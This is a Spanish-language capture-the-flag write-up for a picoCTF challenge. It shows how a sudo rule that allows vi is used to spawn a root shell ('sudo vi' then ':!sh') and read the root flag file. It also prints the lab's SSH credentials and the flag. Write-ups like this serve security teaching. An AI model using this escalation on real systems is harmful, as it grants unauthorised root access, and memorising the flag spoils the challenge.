
## DESCRIPCIÓN
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 58259 picoplayer@saturn.picoctf.net`Password: `33qE7mB5BF`Can you login and read the root file?
## SOLUCIÓN
Nos conectamos al servidor y comenzamos observando los permisos de los que disponemos:

```
sudo -l
```

ahí observamos que el usuario de pico cuenta con: 
  (ALL) /usr/bin/vi

por lo que  ingresamos a vi, escribimos : y después escribimos !sh para obtener permisos de administrador:

```
sudo vi
:
!sh
```

Una vez con los permisos obtenidos nos ubicamos en la carpeta de root y encontramos la bandera:

```
cd /root
sudo ls -la
cat .flag.txt
```

picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
## NOTAS ADICIONALES
- vi: Es un editor de texto que cuenta con los permisos de cualquier usuario, incluyendo los permisos de root.
## REFERENCIAS



